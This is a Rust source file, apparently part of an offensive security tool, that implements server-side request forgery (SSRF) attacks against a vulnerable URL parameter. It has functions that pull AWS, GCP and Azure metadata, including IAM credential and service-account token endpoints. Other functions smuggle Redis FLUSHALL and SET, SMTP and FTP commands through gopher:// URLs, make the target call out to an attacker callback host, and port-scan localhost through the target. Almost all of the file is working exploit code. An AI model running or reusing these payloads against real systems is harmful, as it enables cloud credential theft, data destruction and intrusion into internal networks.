use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

const AWS_METADATA: &[&str] = &[
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name",
    "http://169.254.169.254/latest/user-data",
    "http://[fd00:ec2::254]/latest/meta-data/",
];

const GCP_METADATA: &[&str] = &[
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
];

const AZURE_METADATA: &[&str] = &[
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token",
];

pub async fn metadata(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} SSRF Cloud Metadata Extraction", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let mut all_payloads: Vec<(&str, &str)> = Vec::new();
    for p in AWS_METADATA {
        all_payloads.push(("AWS", p));
    }
    for p in GCP_METADATA {
        all_payloads.push(("GCP", p));
    }
    for p in AZURE_METADATA {
        all_payloads.push(("Azure", p));
    }

    for (cloud, target) in &all_payloads {
        let test_url = format!(
            "{}{}{}={}",
            url,
            if url.contains('?') { "&" } else { "?" },
            param,
            target
        );
        let mut req = client.get(&test_url);
        if *cloud == "GCP" {
            req = req.header("Metadata-Flavor", "Google");
        }
        if *cloud == "Azure" {
            req = req.header("Metadata", "true");
        }
        if let Ok(resp) = req.send().await {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            if status.is_success() && !body.is_empty() {
                println!(
                    "{} [CRITICAL] {} metadata accessible!",
                    "[!]".red().bold(),
                    cloud
                );
                println!("  {} Endpoint: {}", "•".cyan(), target);
                println!("  {} Status:   {}", "•".cyan(), status);
                println!("  {} Content (first 200 chars):", "•".cyan());
                println!("    {}", body.chars().take(200).collect::<String>());
            }
        }
    }

    println!("\n{} Metadata scan complete.", "[*]".cyan().bold());
    Ok(())
}

pub async fn gopher(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} SSRF Gopher Protocol Smuggling", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payloads = [
        (
            "Redis SET",
            "gopher://127.0.0.1:6379/_SET%20ps_ssrf%201%0D%0A",
        ),
        ("Redis FLUSHALL", "gopher://127.0.0.1:6379/_FLUSHALL%0D%0A"),
        ("SMTP HELO", "gopher://127.0.0.1:25/_HELO%20test%0D%0A"),
        (
            "SMTP MAIL",
            "gopher://127.0.0.1:25/_MAIL%20FROM:attacker@test.com%0D%0A",
        ),
        ("FTP LIST", "gopher://127.0.0.1:21/_LIST%0D%0A"),
        (
            "Internal HTTP",
            "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0D%0AHost:%20localhost%0D%0A%0D%0A",
        ),
    ];

    for (name, payload) in &payloads {
        let test_url = format!(
            "{}{}{}={}",
            url,
            if url.contains('?') { "&" } else { "?" },
            param,
            payload
        );
        match client.get(&test_url).send().await {
            Ok(resp) => {
                println!("  {} {:20} status={}", "•".cyan(), name, resp.status());
            }
            Err(e) => {
                println!("  {} {:20} error: {}", "•".cyan(), name, e);
            }
        }
    }

    println!("\n{} Gopher scan complete.", "[*]".cyan().bold());
    Ok(())
}

pub async fn blind(
    url: &str,
    param: &str,
    callback_host: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} Blind SSRF Chain", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:      {}", "[*]".cyan().bold(), url);
    println!("{} Param:    {}", "[*]".cyan().bold(), param);
    println!("{} Callback: {}", "[*]".cyan().bold(), callback_host);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payloads = [
        format!("http://{}/ssrf_test", callback_host),
        format!("http://{callback_host}/ssrf_test"),
        format!("//{}/ssrf_test", callback_host),
        format!("http://{}/.", callback_host),
    ];

    for payload in &payloads {
        let test_url = format!(
            "{}{}{}={}",
            url,
            if url.contains('?') { "&" } else { "?" },
            param,
            payload
        );
        let _ = client.get(&test_url).send().await;
        println!("  {} Sent: {}", "•".cyan(), payload);
    }

    println!(
        "\n{} Monitor callback server for hits.",
        "[*]".cyan().bold()
    );
    Ok(())
}

pub async fn scan(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
    ports: &str,
) -> anyhow::Result<()> {
    println!("{} SSRF Internal Port Scan", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{} Ports: {}", "[*]".cyan().bold(), ports);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let port_list: Vec<u16> = if ports == "common" {
        vec![22, 80, 443, 3306, 5432, 6379, 8080, 8443, 27017, 9200]
    } else {
        ports
            .split(',')
            .filter_map(|p| p.trim().parse().ok())
            .collect()
    };

    for port in &port_list {
        let target = format!("http://127.0.0.1:{}/", port);
        let test_url = format!(
            "{}{}{}={}",
            url,
            if url.contains('?') { "&" } else { "?" },
            param,
            target
        );
        let start = std::time::Instant::now();
        match client.get(&test_url).send().await {
            Ok(resp) => {
                let elapsed = start.elapsed();
                let status = resp.status();
                if status.is_success() || status.as_u16() == 301 || status.as_u16() == 302 {
                    println!(
                        "  {} {:6} OPEN   {} {:.2}s",
                        "•".cyan(),
                        port,
                        status,
                        elapsed.as_secs_f64()
                    );
                } else {
                    println!(
                        "  {} {:6} CLOSED {} {:.2}s",
                        "•".dimmed(),
                        port,
                        status,
                        elapsed.as_secs_f64()
                    );
                }
            }
            Err(_) => {
                println!("  {} {:6} FILTERED", "•".dimmed(), port);
            }
        }
    }

    println!("\n{} Port scan complete.", "[*]".cyan().bold());
    Ok(())
}
